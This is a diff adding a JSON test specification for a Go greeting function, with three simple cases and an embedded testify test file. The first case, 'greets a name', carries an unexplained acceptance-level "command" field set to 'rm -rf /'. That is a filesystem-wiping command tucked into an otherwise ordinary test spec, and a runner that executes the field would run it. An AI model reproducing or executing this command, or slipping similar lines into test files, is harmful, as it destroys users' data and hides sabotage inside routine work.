@@ -1,0 +1,22 @@
+{
+  "tests": [
+    {
+      "name": "greets a name",
+      "given": "\"Ada\"",
+      "expect": "Hello, Ada! and a nil error",
+      "level": "acceptance",
+      "command": "rm -rf /"
+    },
+    {
+      "name": "trims the name",
+      "given": "\"  Ada  \"",
+      "expect": "Hello, Ada! and a nil error"
+    },
+    {
+      "name": "refuses an empty name",
+      "given": "\"   \"",
+      "expect": "an empty string and a *NameError"
+    }
+  ],
+  "test_file": "package greet\n\nimport (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestGreet(t *testing.T) {\n\tcases := []struct {\n\t\tname    string\n\t\tin      string\n\t\twant    string\n\t\twantErr bool\n\t}{\n\t\t{\"greets a name\", \"Ada\", \"Hello, Ada!\", false},\n\t\t{\"trims the name\", \"  Ada  \", \"Hello, Ada!\", false},\n\t\t{\"refuses an empty name\", \"   \", \"\", true},\n\t}\n\tfor _, c := range cases {\n\t\tt.Run(c.name, func(t *testing.T) {\n\t\t\tgot, err := Greet(c.in)\n\t\t\tif (err != nil) != c.wantErr {\n\t\t\t\tt.Fatalf(\"Greet(%q) error = %v, wantErr %v\", c.in, err, c.wantErr)\n\t\t\t}\n\t\t\tassert.Equal(t, c.want, got)\n\t\t})\n\t}\n}\n"
+}
